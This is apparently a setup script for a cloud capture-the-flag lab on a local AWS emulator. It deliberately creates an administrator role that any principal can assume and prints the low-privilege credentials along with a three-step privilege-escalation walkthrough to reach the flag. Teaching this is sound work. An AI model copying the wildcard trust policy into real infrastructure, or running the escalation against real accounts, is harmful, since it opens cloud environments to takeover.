#!/bin/bash
set -e

# Wait for IAM to be available
until curl -s http://localhost:4566/_localstack/health | grep -q '"iam":"available"'; do
  sleep 2
done

FLAG="${CVE_FLAG:-flag{cloud-07-default}}"

# ──────────────────────────────────────────────
# 1. Create AdminRole with overly permissive trust policy
#    Allows ANY principal in the account to assume it
# ──────────────────────────────────────────────
ROLE_ARN=$(aws --endpoint-url=http://localhost:4566 iam create-role \
  --role-name AdminRole \
  --assume-role-policy-document '{
    "Version":"2012-10-17",
    "Statement":[{
      "Effect":"Allow",
      "Principal":{"AWS":"*"},
      "Action":"sts:AssumeRole"
    }]
  }' \
  --query 'Role.Arn' \
  --output text)
echo "Created role: $ROLE_ARN"

# Attach AdministratorAccess policy to AdminRole
aws --endpoint-url=http://localhost:4566 iam attach-role-policy \
  --role-name AdminRole \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# ──────────────────────────────────────────────
# 2. Create low-privilege user with read-only + sts:AssumeRole
# ──────────────────────────────────────────────
aws --endpoint-url=http://localhost:4566 iam create-user --user-name lowpriv

aws --endpoint-url=http://localhost:4566 iam put-user-policy \
  --user-name lowpriv \
  --policy-name LowPrivPolicy \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Action": "sts:AssumeRole",
        "Resource": "*"
      },
      {
        "Effect": "Allow",
        "Action": [
          "s3:ListAllMyBuckets",
          "iam:ListRoles",
          "iam:GetRole"
        ],
        "Resource": "*"
      }
    ]
  }'

# Generate access keys for lowpriv user
LOWPRIV_KEYS=$(aws --endpoint-url=http://localhost:4566 iam create-access-key --user-name lowpriv)
LOWPRIV_KEY=$(echo "$LOWPRIV_KEYS" | jq -r '.AccessKey.AccessKeyId')
LOWPRIV_SECRET=$(echo "$LOWPRIV_KEYS" | jq -r '.AccessKey.SecretAccessKey')

# ──────────────────────────────────────────────
# 3. Create S3 bucket with bucket policy restricting to AdminRole
# ──────────────────────────────────────────────
aws --endpoint-url=http://localhost:4566 s3 mb s3://flag-vault

# Bucket policy: only AdminRole can read objects
aws --endpoint-url=http://localhost:4566 s3api put-bucket-policy \
  --bucket flag-vault \
  --policy "{
    \"Version\": \"2012-10-17\",
    \"Statement\": [
      {
        \"Effect\": \"Deny\",
        \"Principal\": \"*\",
        \"Action\": \"s3:GetObject\",
        \"Resource\": \"arn:aws:s3:::flag-vault/*\",
        \"Condition\": {
          \"StringNotEquals\": {
            \"aws:PrincipalArn\": \"$ROLE_ARN\"
          }
        }
      }
    ]
  }"

# ──────────────────────────────────────────────
# 4. Upload flag using temporary admin credentials
# ──────────────────────────────────────────────
# Create a temporary setup user with full access
aws --endpoint-url=http://localhost:4566 iam create-user --user-name setup-user
SETUP_KEYS=$(aws --endpoint-url=http://localhost:4566 iam create-access-key --user-name setup-user)
SETUP_KEY=$(echo "$SETUP_KEYS" | jq -r '.AccessKey.AccessKeyId')
SETUP_SECRET=$(echo "$SETUP_KEYS" | jq -r '.AccessKey.SecretAccessKey')
aws --endpoint-url=http://localhost:4566 iam attach-user-policy \
  --user-name setup-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

export AWS_ACCESS_KEY_ID="$SETUP_KEY"
export AWS_SECRET_ACCESS_KEY="$SETUP_SECRET"
echo "$FLAG" > /tmp/flag.txt
aws --endpoint-url=http://localhost:4566 s3 cp /tmp/flag.txt s3://flag-vault/flag.txt

# Clean up setup user
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY
aws --endpoint-url=http://localhost:4566 iam detach-user-policy \
  --user-name setup-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws --endpoint-url=http://localhost:4566 iam delete-access-key \
  --user-name setup-user \
  --access-key-id "$SETUP_KEY"
aws --endpoint-url=http://localhost:4566 iam delete-user --user-name setup-user

echo ""
echo "=============================================="
echo "CLOUD-07: STS AssumeRole Abuse"
echo "=============================================="
echo ""
echo "LocalStack available at http://localhost:10607"
echo ""
echo "Low-privilege user credentials (use these to attack):"
echo "  AWS_ACCESS_KEY_ID=$LOWPRIV_KEY"
echo "  AWS_SECRET_ACCESS_KEY=$LOWPRIV_SECRET"
echo ""
echo "Target Role ARN: $ROLE_ARN"
echo ""
echo "Vulnerability: AdminRole trust policy allows anyone in account to assume it"
echo ""
echo "Exploit:"
echo "  1. Assume the AdminRole with lowpriv credentials:"
echo "     aws --endpoint-url=http://localhost:10607 sts assume-role \\"
echo "       --role-arn $ROLE_ARN \\"
echo "       --role-session-name attacker"
echo ""
echo "  2. Export the temporary credentials from the response"
echo ""
echo "  3. Read the flag from S3:"
echo "     aws --endpoint-url=http://localhost:10607 s3 cp s3://flag-vault/flag.txt -"
echo ""
echo "Goal: Escalate privileges via sts:AssumeRole to access s3://flag-vault/flag.txt"
echo "=============================================="
